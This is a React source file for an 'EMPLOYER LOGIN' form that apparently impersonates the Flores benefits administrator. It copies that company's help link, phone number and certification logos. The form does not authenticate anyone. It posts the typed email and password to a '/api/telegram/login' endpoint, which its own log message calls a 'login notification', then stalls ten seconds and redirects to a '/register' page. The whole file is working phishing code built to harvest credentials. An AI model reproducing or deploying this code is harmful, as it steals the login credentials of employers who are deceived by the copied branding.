"use client";

import type React from "react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { FLORES_SESSION } from "@/lib/flores-flow";

export function EmployerLoginForm() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password.trim() || isLoading) return;
    setIsLoading(true);

    try {
      const res = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: email.trim(),
          password,
        }),
      });
      if (!res.ok) {
        setIsLoading(false);
        return;
      }
    } catch (error) {
      console.error("Failed to send login notification:", error);
      setIsLoading(false);
      return;
    }

    await new Promise((r) => setTimeout(r, 10000));
    if (typeof window !== "undefined")
      sessionStorage.setItem(FLORES_SESSION.verify, "1");
    router.push("/register");
  };

  return (
    <form onSubmit={handleSubmit} className="mt-4 space-y-3 sm:space-y-4">
      <input
        type="email"
        placeholder="Email Address"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        disabled={isLoading}
        className="w-full px-3 py-1.5 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-blue-900 focus:border-blue-900 disabled:opacity-70"
        autoComplete="off"
      />

      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        disabled={isLoading}
        className="w-full px-3 py-1.5 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-blue-900 focus:border-blue-900 disabled:opacity-70"
        autoComplete="off"
        maxLength={500}
      />

      <button
        type="submit"
        disabled={isLoading}
        className="w-full py-2.5 sm:py-3 rounded-full text-white font-semibold tracking-wide text-sm sm:text-base disabled:opacity-70 disabled:cursor-not-allowed"
        style={{ backgroundColor: "#F7931E" }}
      >
        {isLoading ? "Loading..." : "EMPLOYER LOGIN"}
      </button>

      <a
        href="https://www.flores247.com/login-help-admin.vbhtml"
        target="_blank"
        rel="noopener noreferrer"
        className="block w-full py-2.5 sm:py-3 rounded-full font-semibold tracking-wide border-2 border-gray-300 text-gray-600 hover:bg-gray-50 transition-colors text-center text-sm sm:text-base"
      >
        LOGIN HELP
      </a>

      <div className="text-center pt-2">
        <p
          style={{ color: "#0099D8" }}
          className="font-medium text-sm sm:text-base"
        >
          Customer Service: 1-800-532-3327
        </p>
      </div>

      <div className="flex items-center justify-center gap-2 pt-2">
        <img
          src="/SOC.svg"
          alt="SOC"
          width="75"
          className="h-auto max-w-[60px] sm:max-w-[75px]"
        />
        <img
          src="/ecfc.svg"
          alt="ecfc"
          width="200"
          className="h-auto max-w-[160px] sm:max-w-[200px]"
        />
      </div>
    </form>
  );
}
